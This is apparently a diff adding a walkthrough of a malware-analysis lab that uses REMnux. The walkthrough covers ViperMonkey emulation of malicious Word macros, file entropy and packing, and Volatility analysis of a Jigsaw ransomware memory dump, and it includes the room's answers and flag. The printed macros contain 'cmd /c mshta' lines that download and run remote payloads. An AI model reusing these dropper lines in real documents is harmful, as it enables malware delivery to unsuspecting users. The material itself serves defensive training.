@@ -269,3 +269,275 @@ in file:  - OLE stream: u'Macros/VBA/ThisDocument'
 -------------------------------------------------------------------------------
 VBA CODE (with long lines collapsed):
 Private Sub DefoLegit()
+    Shell ("cmd /c mshta http://10.0.0.10:4444/MyDropper.exe")
+End Sub
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO     parsed Sub DefoLegit (): 1 statement(s)
+INFO     Reading document variables...
+INFO     Reading document comments...
+INFO     Reading Shapes object text fields...
+INFO     Reading InlineShapes object text fields...
+INFO     Reading TextBox and RichEdit object text fields...
+INFO     Reading custom document properties...
+INFO     Reading embedded object text fields...
+INFO     Reading document text and tables...
+Traceback (most recent call last):
+  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py", line 17, in <module>
+    from unotools import Socket, connect
+ModuleNotFoundError: No module named 'unotools'
+ERROR    Running export_doc_text.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py', '--text', '-f', '/tmp/tmp_word_file_5917811720']' returned non-zero exit status 1         
+INFO     Reading form variables...
+
+-------------------------------------------------------------------------------
+TRACING VBA CODE (entrypoint = Auto*):
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/sType/ResourceEvent'                                                   
+INFO     Found possible intermediate IOC (URL): 'http://www.w3.org/1999/02/22-rdf-syntax-ns'                                                        
+INFO     Found possible intermediate IOC (URL): 'http://purl.org/dc/elements/1.1/'                                                                  
+INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'                                             
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/mm/'                                                                   
+INFO     Found possible intermediate IOC (URL): 'http://10.0.0.10:4444/MyDropper.exe'                                                               
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/photoshop/1.0/'                                                                
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/'                                                                      
+INFO     Emulating loose statements...
+WARNING  No entry points found. Using heuristics to find entry points...
+INFO     ACTION: Found Heuristic Entry Point - params 'DefoLegit' - 
+INFO     evaluating Sub DefoLegit
+INFO     Calling Procedure: Shell("['cmd /c mshta http://10.0.0.10:4444/MyDropper.exe']")                                                           
+INFO     Shell('cmd /c mshta http://10.0.0.10:4444/MyDropper.exe')
+INFO     ACTION: Execute Command - params 'cmd /c mshta http://10.0.0.10:4444/MyDropper.exe' - Shell function                                       
+INFO     ACTION: Found Heuristic Entry Point - params 'DefoLegit' - 
+INFO     evaluating Sub DefoLegit
+INFO     Calling Procedure: Shell("['cmd /c mshta http://10.0.0.10:4444/MyDropper.exe']")                                                           
+INFO     Shell('cmd /c mshta http://10.0.0.10:4444/MyDropper.exe')
+INFO     ACTION: Execute Command - params 'cmd /c mshta http://10.0.0.10:4444/MyDropper.exe' - Shell function                                       
+
+Recorded Actions:
++----------------------+---------------------------+----------------+
+| Action               | Parameters                | Description    |
++----------------------+---------------------------+----------------+
+| Found Heuristic      | DefoLegit                 |                |
+| Entry Point          |                           |                |
+| Execute Command      | cmd /c mshta http://10.0. | Shell function |
+|                      | 0.10:4444/MyDropper.exe   |                |
+| Found Heuristic      | DefoLegit                 |                |
+| Entry Point          |                           |                |
+| Execute Command      | cmd /c mshta http://10.0. | Shell function |
+|                      | 0.10:4444/MyDropper.exe   |                |
++----------------------+---------------------------+----------------+
+
+INFO     Found 7 possible IOCs. Stripping duplicates...
+VBA Builtins Called: ['Shell']
+
+Finished analyzing DefinitelyALegitInvoice.doc .
+```
+What is the name of the Macro for "DefinitelyALegitInvoice.doc"
+*DefoLegit*
+```text
+remnux@thm-remnux:~/Tasks/4$ vmonkey Taxes2020.doc 
+ _    ___                 __  ___            __             
+| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
+| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
+| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
+|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
+     /_/                                           /____/   
+vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/ViperMonkey/issues
+
+===============================================================================
+FILE: Taxes2020.doc
+INFO     Starting emulation...
+INFO     Emulating an Office (VBA) file.
+INFO     Reading document metadata...
+Traceback (most recent call last):
+  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in <module>
+    from unotools import Socket, connect
+ModuleNotFoundError: No module named 'unotools'
+ERROR    Running export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_6874051711']' returned non-zero exit status 1        
+ERROR    Reading in file as Excel with xlrd failed. Can't find workbook in OLE2 compound document                                                   
+INFO     Saving dropped analysis artifacts in .//Taxes2020.doc_artifacts/
+INFO     Parsing VB...
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file:  - OLE stream: u'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Private Sub X544FE()
+    Shell ("cmd /c mshta http://tryhackme.com/notac2cserver.sh")
+End Sub
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO     parsed Sub X544FE (): 1 statement(s)
+INFO     Reading document variables...
+INFO     Reading document comments...
+INFO     Reading Shapes object text fields...
+INFO     Reading InlineShapes object text fields...
+INFO     Reading TextBox and RichEdit object text fields...
+INFO     Reading custom document properties...
+INFO     Reading embedded object text fields...
+INFO     Reading document text and tables...
+Traceback (most recent call last):
+  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py", line 17, in <module>
+    from unotools import Socket, connect
+ModuleNotFoundError: No module named 'unotools'
+ERROR    Running export_doc_text.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py', '--text', '-f', '/tmp/tmp_word_file_6155421071']' returned non-zero exit status 1         
+INFO     Reading form variables...
+
+-------------------------------------------------------------------------------
+TRACING VBA CODE (entrypoint = Auto*):
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/sType/ResourceEvent'                                                   
+INFO     Found possible intermediate IOC (URL): 'http://www.w3.org/1999/02/22-rdf-syntax-ns'                                                        
+INFO     Found possible intermediate IOC (URL): 'http://purl.org/dc/elements/1.1/'                                                                  
+INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'                                             
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/mm/'                                                                   
+INFO     Found possible intermediate IOC (URL): 'http://tryhackme.com/notac2cserver.sh'                                                             
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/photoshop/1.0/'                                                                
+INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/'                                                                      
+INFO     Emulating loose statements...
+WARNING  No entry points found. Using heuristics to find entry points...
+INFO     ACTION: Found Heuristic Entry Point - params 'X544FE' - 
+INFO     evaluating Sub X544FE
+INFO     Calling Procedure: Shell("['cmd /c mshta http://tryhackme.com/notac2cserver.sh']")                                                         
+INFO     Shell('cmd /c mshta http://tryhackme.com/notac2cserver.sh')
+INFO     ACTION: Execute Command - params 'cmd /c mshta http://tryhackme.com/notac2cserver.sh' - Shell function                                     
+INFO     ACTION: Found Heuristic Entry Point - params 'X544FE' - 
+INFO     evaluating Sub X544FE
+INFO     Calling Procedure: Shell("['cmd /c mshta http://tryhackme.com/notac2cserver.sh']")                                                         
+INFO     Shell('cmd /c mshta http://tryhackme.com/notac2cserver.sh')
+INFO     ACTION: Execute Command - params 'cmd /c mshta http://tryhackme.com/notac2cserver.sh' - Shell function                                     
+
+Recorded Actions:
++----------------------+---------------------------+----------------+
+| Action               | Parameters                | Description    |
++----------------------+---------------------------+----------------+
+| Found Heuristic      | X544FE                    |                |
+| Entry Point          |                           |                |
+| Execute Command      | cmd /c mshta http://tryha | Shell function |
+|                      | ckme.com/notac2cserver.sh |                |
+| Found Heuristic      | X544FE                    |                |
+| Entry Point          |                           |                |
+| Execute Command      | cmd /c mshta http://tryha | Shell function |
+|                      | ckme.com/notac2cserver.sh |                |
++----------------------+---------------------------+----------------+
+
+INFO     Found 7 possible IOCs. Stripping duplicates...
+VBA Builtins Called: ['Shell']
+
+Finished analyzing Taxes2020.doc .
+```
+What is the URL the Macro in "Taxes2020.doc" would try to launch?
+`http://tryhackme.com/notac2cserver.sh`
+### 5. I Hope You Packed Your Bags
+REMnux® is a Linux toolkit for reverse-engineering and analyzing malicious software.
+But first: Entropy 101
+There's a reason why I've waited until now to discuss file entropy in the malware series.
+REMnux provides a nice range of command-line tools that allow for bulk or semi-automated classification and static analysis. File entropy is very indicative of the suspiciousness of a file and is a prominent characteristic that these tools look for within a Portable Executable (PE).
+At it's very simplest, file entropy is a rating that scores how random the data within a PE file is. With a scale of 0 to 8. 0 meaning the less "randomness" of the data in the file, where a scoring towards 8 indicates this data is more "random".
+For example, files that are encrypted will have a very high entropy score. Where files that have large chunks of the same data such as "1's" will have a low entropy score.
+Okay...so?
+Malware authors use techniques such as encryption or packing (we'll come onto this next) to obfuscate their code and to attempt to bypass anti-virus. Because of this, these files will have high entropy. If an analyst had 1,000 files, they could rank the files by their entropy scoring, of course, the files with the higher entropy should be analysed first.
+![](https://i.imgur.com/4lgx8FM.png)
+Whereas however, this file would have a high entropy because there's no pattern to the data - it's a lot more random in comparison.
+![](https://i.imgur.com/kX0JcNy.png)
+Packing and Unpacking
+I briefly discussed this in my   MAL: Introductory room, but that doesn't do this topic justice.
+We'll start with a bit of theory (so bare with me here) on how packing works and why it's used. Packer's use an executable as a source and output's it to another executable. This executable will have had some modifications made depending on the packer. For example, the new executable could be compressed and/or obfuscated by using mathematics.
+Legitimate software developers use packing to reduce the size of their applications and to ultimately protect their work from being stolen. It is, however, a double-edged sword, malware authors reap the benefits of packing to make the reverse engineering and detection of the code hard to impossible.
+Executables have what's called an entry point. When launched, this entry point is simply the location of the first pieces of code to be executed within the file - as illustrated below:
+![](https://i.imgur.com/gZgqg2n.png)
+(Sikorski and Honig, 2012)
+When an executable is packed, it must unpack itself before any code can execute. Because of this, packers change the entry point from the original location to what's called the "Unpacking Stub".
+![](https://i.imgur.com/zKEDArl.png)
+(Sikorski and Honig, 2012)
+The "Unpacking Stub" will begin to unpack the executable into its original state. Once the program is fully unpacked, the entry point will now relocate back to its normal place to begin executing code:
+![](https://i.imgur.com/o3dRrTh.png)
+(Sikorski and Honig, 2012)
+It is only at this point can an analyst begin to understand what the executable is doing as it is now in it's true, original form.
+Determining if an Executable is Packed
+Don't worry, learning how to manually unpack an executable is out-of-scope for this pathway. We have a few tools at our arsenal that should do a sufficient job for most of the samples we come across in the wild.
+Packed files have a few characteristics that may indicate whether or not they are packed:
+Remember about file entropy? Packed files will have a high entropy!
+There are very few "Imports", packed files may only have "GetProcAddress" and "LoadLibrary".
+The executable may have sections named after certain packers such as UPX.
+Demonstration
+I have two copies of my application, one not packed and another has been packed.
+Below we can see that this copy has 34 imports, so a noticeable amount and the imports are quite revealing in what we can expect the application to do:
+![](https://i.imgur.com/HdG2Gol.png)
+Whereas the other copy only presents us with 6 imports.
+![](https://i.imgur.com/5TZ8pa5.png)
+We can verify that this was packed using UPX via tools such as [PEID](https://www.aldeid.com/wiki/PEiD), or by manually comparing the executables sections and filesize differences.
+![](https://i.imgur.com/jgp7geN.png)
+Look at that entropy! 7.526 out of 8! Also, note the name of the sections. UPX0 and the entry point being at UPX1...that's our packer.
+![](https://i.imgur.com/BKlrTA0.png)
+What is the highest file entropy a file can have?
+*8*
+What is the lowest file entropy a file can have?
+*0*
+Name a common packer that can be used for applications?
+*UPX*
+### 6. How's Your Memory?
+If you've had enough of hearing about entropy and packing - I don't blame you, me too.
+Memory Forensics
+This section is a supplement to DarkStar's room on the fundamentals of using Volatility which I highly recommend checking out. This task was more of an in-impromptu "when in Rome" sort of idea. I thought it'd be fun to be able to learn about then transfer knowledge to a real-world scenario.
+You are going to be analysing the memory dump I've taken of a Windows 7 PC that has been infected with the Jigsaw Ransomware. This memory dump can be found in "/home/remnux/Tasks/6/Win7-Jigsaw.raw".
+![](https://i.imgur.com/hzhY3OC.png)
+A Volatility Crash Course
+Understanding our Memory Dump
+It goes without saying that every operating system will store data in different places, and this is no different when data is stored within memory. Volatility is unable to assume what the operating system that we have created a memory dump is, and in turn, where to look for things and what commands can be executed. For example, hivelist is used for Windows registry and will not work on a Linux memory dump.
+Whilst Volatility can't assume, it can guess. Here's where profiles come into play. In other scenarios, we would use the imageinfo plugin to help determine what profile is most suitable with the syntax of volatility -f Win7-Jigsaw.raw imageinfo. However, this could take hours to complete on a large memory dump on an Instance like that attached to the room. So instead, I have provided it for you.
+Please note that volatility will take a few minutes for commands to complete.
+![](https://i.imgur.com/vSyKXJl.png)
+Profile `Win7SP1x64` is the first suggested and just happens to be the correct OS version.
+Beginning our Investigation
+Viewing What Processes Were Running at Infection
+"A process, in the simplest terms, is an executing program." (Processes and Threads - Win32 apps, 2018)
+Processes range from every-day applications such as your browser to system services and other inner-workings.
+Specifically, we need to identify the malicious processes to get an understanding of how the malware works and to also build a picture of Indicators of Compromise (IoC). We can list the processes that were running via pslist:
+volatility -f Win7-Jigsaw.raw --profile=Win7SP1x64 pslist
+Note how you can see Google Chrome within the process because the application was running at the time of the memory dump.
+![](https://i.imgur.com/pZwWizH.png)
+Needles in Haystacks
+Luckily we've got quite a shortlist of processes here, so we can start to narrow down between the system processes and any applications.
+It can be daunting at first in trying to decide on what's worthy of investigating. As your seat time in malware analysis increases, you'll be able to pick out abnormalities. In this case, it's process "drpbx.exe" with a PID of 3704.
+What Can We Do With This?
+Now that we've identified the abnormal process, we can begin to dump this specifically and begin analysing. As the application will be unpacked and/or in it's most revealing state, it is perfect for analysis.
+Peeking Behind the Curtain
+Even without analysing, we can start to understand what sort of interaction the process is capable of with the operating system. DLL's are structured very similarly to executables, however, they cannot be directly executed. Moreover, multiple applications can interact with a DLL all at the same time. We can list the DLL's that "drpbx.exe" references with dlllist:
+All the DLL'S
+Again, it's easy to become overwhelmed at trying to figure out what's of significance. It only comes with time, experience and research into what Windows DLL's do what.
+![](https://i.imgur.com/S7aICI0.png)
+What stands out initially is the "CRYPTBASE.dll"
+![](https://i.imgur.com/r1qtrXJ.png)
+This DLL is a Windows library that allows applications to use cryptography. Whilst many use it legitimately, i.e. HTTPS, let's assume that we didn't know that the host was infected with ransomware specifically, we'd need to start investigating the process further. However, that is not for here. We've found enough evidence to suspect ransomware through memory forensics & research.
+Pretty interesting stuff!
+*No answer needed*
+### 7. Finishing Up
+I encourage you to go back through the tasks and use alternate tools to that which I used, all located within the attached REMnux box. Malicious macros within Microsoft Office documents are very successful and dangerous vehicles for malware authors to weaponise. Whilst macros have legitimate purposes in MS Office documents, rampant APT campaigns such as Emotet, Ryuk and Qakbot exploit these as droppers.
+For a bonus challenge, spend some more time in getting familiar with Volatility. Are there any more additional indicators of compromise within the Windows 7 memory dump that we briefly analyzed?
+So long and thanks for all the fish ~CMNatic.
+Fin.
+
+## Flags / Answers
+- ***THM{Luckily_This_Isn't_Harmful}***
+
+## Notes / Lessons Learned
+References
+Task 1
+Zeltser Security Corp., 2020. REMnux (image) Retrieved from: https://remnux.org/
+Task 5
+Sikorski, M. and Honig, A., 2012. Practical Malware Analysis. San Francisco: No Starch Press, pp.386-387.
+Task 6
+Docs.microsoft.com. 2018. Processes And Threads - Win32 Apps. Retrieved from: https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads
+Additional Reading
+A Look At Entropy Analysis (https://fsec404.github.io/blog/Shanon-entropy/)
+[BlackHat 2019] Investigating Malware Using Memory Forensics (Video)(https://www.youtube.com/watch?v=BMFCdAGxVN4)
+Malware Threat Report - Q2 2020 (Avira)(https://www.avira.com/en/blog/malware-threat-report-q2-2020-statistics-and-trends)
+Malware Detection in PDF and Office Documents: A survey(https://api.semanticscholar.org/CorpusID:212680542%20(P.%20Singh,%20S.%20Tapaswi,%20S.Gupta))
+Cheatsheets
+REMnux 7.0 Documentation(https://docs.remnux.org/)
+Volatility 2.4. Windows & Linux Profile Cheatsheets(https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)
+I'm curious to read up some more!
+[[Autopsy]]
+
